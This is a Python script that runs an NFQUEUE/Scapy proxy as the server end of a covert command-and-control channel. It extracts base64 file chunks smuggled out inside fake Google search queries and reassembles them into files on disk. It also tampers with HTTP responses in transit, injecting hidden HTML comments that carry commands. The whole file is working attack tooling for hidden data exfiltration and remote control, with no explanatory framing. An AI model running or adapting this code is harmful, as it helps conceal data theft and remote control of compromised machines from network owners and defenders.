from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import re
import base64
import os

TARGET_HOST = b"www.google.com"
COVERT_CMD = "ACK"

# Store file chunks per TCP stream
file_chunks = {}

def save_chunk(data):
    match = re.match(r"(\d+)/(\d+):(.*)", data)
    if not match:
        return
    idx, total, b64data = match.groups()
    idx = int(idx)
    total = int(total)

    if "file" not in file_chunks:
        file_chunks["file"] = [""] * total

    file_chunks["file"][idx] = b64data

    print(f"[PROXY] Received chunk {idx+1}/{total}")

    # If all chunks are filled, save file
    if all(file_chunks["file"]):
        combined = "".join(file_chunks["file"])
        file_bytes = base64.b64decode(combined)
        os.makedirs("received_files", exist_ok=True)
        out_path = f"received_files/received_{len(file_bytes)}B.bin"
        with open(out_path, "wb") as f:
            f.write(file_bytes)
        print(f"[PROXY] Reassembled and saved file: {out_path}")
        file_chunks.clear()

def inject_command(payload, command):
    try:
        html = payload.decode(errors="ignore")
        if "</body>" in html:
            html = html.replace("</body>", f"<!-- C2CMD:{command} --></body>")
        return html.encode()
    except Exception:
        return payload

def extract_covert_message(payload):
    try:
        data = payload.decode(errors="ignore")
        match = re.search(r"GET /search\?q=What\+is\+([^\+]+)\+\?", data)
        if match:
            save_chunk(match.group(1))
    except Exception:
        pass

def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())

    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        tcp = scapy_pkt[TCP]
        raw_load = scapy_pkt[Raw].load

        if tcp.dport == 80 and TARGET_HOST in raw_load:
            extract_covert_message(raw_load)

        if tcp.sport == 80 and b"</body>" in raw_load:
            new_payload = inject_command(raw_load, COVERT_CMD)
            scapy_pkt[Raw].load = new_payload
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

if __name__ == "__main__":
    print("[+] NFQUEUE proxy running with chunked file support")
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    nfqueue.run()
